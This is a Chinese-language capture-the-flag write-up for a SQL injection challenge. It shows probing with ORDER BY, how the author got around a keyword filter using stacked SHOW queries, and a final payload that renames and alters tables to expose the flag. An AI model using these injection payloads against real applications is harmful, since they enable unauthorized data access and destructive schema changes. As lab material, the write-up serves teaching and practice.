# supersqli

题目描述：随便注

遇到 `SQL` 题我是有一点点恶感和害怕的, 感觉每题的注射方式都不一样!

尝试一些简单的值: `1'` 返回错误:

`error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1`

从 `MariaDB` 我们可以知道这题是 `MYSQL` 注入.

检查 `table` 有 2 `columns`:

```
?inject=1'+order+by+1--+
?inject=1'+order+by+2--+
?inject=1'+order+by+3--+ 返回错误
```

本题也 `filter` 一些字:

```
?inject=1'+union+select+1,2--+
返回: return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

试了所有我知道的方法, 还是不能绕过这个 `filter`. 太绝望了, 决定找一下 write up. 原来在 `MYSQL` 中有命令 `show` 可以用.

显示 `table`:

`?inject=-1';show+tables--+-`

`-1` 是用来清除页面, 因为 `inject=-1` 没有显示任何数据. 我们得到 `2` 个 `table` 是 `1919810931114514` 和 `words`. 以为到这应该快要成功. 显示 `table` 的 `columns`:

`?inject=-1';show+columns+from+`1919810931114514`--+-`

```
array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

`?inject=-1';show+columns+from+words--+-`

```
array(6) {
  [0]=>
  string(2) "id"
  [1]=>
  string(7) "int(10)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

array(6) {
  [0]=>
  string(4) "data"
  [1]=>
  string(11) "varchar(20)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

又是一次绝望, 看了 write up 后, 原来还有这样一种思路: 因为当开始我门读取 `inject=1`, `inject=2` 只读到两个 `inject` 的值, 所以页面显示我们可以读取的数据属于 `words`, 但 `flag` 又在 `1919810931114514` 里. 那么, 可以把这两个 `table` 的内容相换!!!

```
?inject=-1'%3bRENAME+TABLE+`words`+TO+`words1`%3bRENAME+TABLE+`1919810931114514`+TO+`words`%3bALTER+TABLE+`words`+CHANGE+`flag`+`id`+VARCHAR(100)+CHARACTER+SET+utf8+COLLATE+utf8_general_ci+NOT+NULL%3b--+-
```

现在我们已经可以读取 `words` 的内容和那到 `flag`:

`?inject=1'+or+1=1--+-`
